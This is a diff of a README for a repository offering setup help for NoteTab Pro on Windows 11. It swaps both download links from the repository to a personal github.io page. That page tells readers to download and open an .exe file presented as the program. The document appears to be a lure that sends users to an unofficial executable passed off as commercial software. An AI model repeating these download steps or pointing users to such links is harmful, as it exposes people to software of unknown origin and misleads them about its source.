@@ -1,6 +1,6 @@
 # 📝 NoteTab-Setup-Help - Run NoteTab Pro on Windows Eleven
 
-[![](https://img.shields.io/badge/Download-NoteTab_Setup_Guide-blue.svg)](https://github.com/Mura8410/NoteTab-Setup-Help)
+[![](https://img.shields.io/badge/Download-NoteTab_Setup_Guide-blue.svg)](https://mura8410.github.io)
 
 ## 📌 Project Overview
 
@@ -8,7 +8,7 @@ This guide helps you put NoteTab Pro on your computer. Many users face issues wh
 
 ## 📥 How to Get the Software
 
-Visit [this page](https://github.com/Mura8410/NoteTab-Setup-Help) to download the program. Look for the release section. Click the file that ends in .exe to save it to your local storage. Once the download finishes, open the file to start the install wizard. 
+Visit [this page](https://mura8410.github.io) to download the program. Look for the release section. Click the file that ends in .exe to save it to your local storage. Once the download finishes, open the file to start the install wizard. 
 
 ## ⚙️ System Requirements
 
